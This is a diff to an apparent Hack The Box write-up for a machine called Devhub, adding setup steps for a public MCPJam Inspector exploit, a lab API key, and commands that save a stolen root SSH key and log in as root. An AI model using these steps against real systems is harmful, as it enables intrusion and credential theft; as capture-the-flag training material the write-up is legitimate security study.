@@ -49,6 +49,17 @@ While researching this vulnerability, I found that with an HTTP request specific
 
 A public Python exploit was used against the vulnerable instance.
 
+```bash
+git clone https://github.com/daemoncibsec/mcpExec.git
+cd mcpExec
+python3 -m venv venv
+source venv/bin/activate
+pip install rich
+pip install argparse
+pip install requests
+chmod +x mcpExec.py
+```
+
 After starting a listener:
 
 ```bash
@@ -122,8 +133,6 @@ analyst
 
 # Lateral Movement
 
-At this stage I needed assistance reviewing public documentation to understand the intended attack path.
-
 The local machine exposed an internal API used by the analyst account.
 
 After reviewing the functionality of that API, it became possible to retrieve the analyst user's SSH private key.
@@ -159,6 +168,7 @@ ps aux | grep jupyter
 Among the running services, a **root-owned Jupyter-related process** caught my attention. Reviewing the associated `server.py` file revealed that it implemented an internal API listening on port **5000**.
 
 The source code also exposed an API key:
+
 
 ```text
 opsmcp_secret_key_4f5a6b7c8d9e0f1a
@@ -200,18 +210,19 @@ The response contained the **root private SSH key**.
 I saved it locally:
 
 ```bash
-echo "<PRIVATE_KEY>" > root_id_rsa
-chmod 600 root_id_rsa
+echo -e "<PRIVATE_KEY>" > root_privkey
+chmod 600 root_privkey
 ```
 
 Then authenticated directly as root:
 
 ```bash
-ssh -i root_id_rsa root@<TARGET_IP>
+ssh -i root_privkey root@<TARGET_IP>
 ```
 
 Successful authentication granted a root shell.
 
+![image alt](https://github.com/Eliaspaz2/HTB-Writeups/blob/dd3ecd3a20329e9b3359b8e3d1032f3ca53dfa88/Medium/Devhub/03-root_gain-devhub.png)
 
 Verification:
 
@@ -277,7 +288,7 @@ Root:
 - Netcat
 - Python
 - SSH
-- ActiveMQ Public Exploit
+- MCPJam Inspector Public Exploit
 - LinPEAS (optional)
 - Manual Enumeration
 
@@ -288,7 +299,7 @@ Root:
 ```
 Nmap
         ↓
-Apache ActiveMQ Version Enumeration
+MCPJam Inspector Version Enumeration
         ↓
 Public CVE
         ↓
